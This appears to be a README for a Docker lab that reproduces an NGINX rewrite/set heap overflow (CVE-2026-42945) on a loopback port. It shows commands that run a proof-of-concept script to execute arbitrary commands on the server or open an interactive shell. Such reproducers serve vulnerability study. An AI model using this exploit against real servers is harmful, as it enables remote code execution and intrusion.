# NGINX Rift

Local Docker reproducer for CVE-2026-42945, an NGINX rewrite/set script-engine heap overflow.

## Update Note (2026-07-24)

Added pinned versions for the Ubuntu base image, package snapshot/package versions, and NGINX source revision to keep reproduction stable across rebuilds.

## Setup

```sh
./setup.sh
docker compose -f env/docker-compose.yml up
```

The lab exposes vulnerable NGINX on `127.0.0.1:19321`.

The Dockerfile pins the Ubuntu base image digest, Ubuntu package snapshot, package versions, and NGINX git revision used for this repro.

## Reproduce

In another terminal:

```sh
python3 poc.py --cmd 'echo hello from nginx-rift > /tmp/pwned'
docker compose -f env/docker-compose.yml exec nginx cat /tmp/pwned
```

For an interactive shell:

```sh
python3 poc.py --shell
```
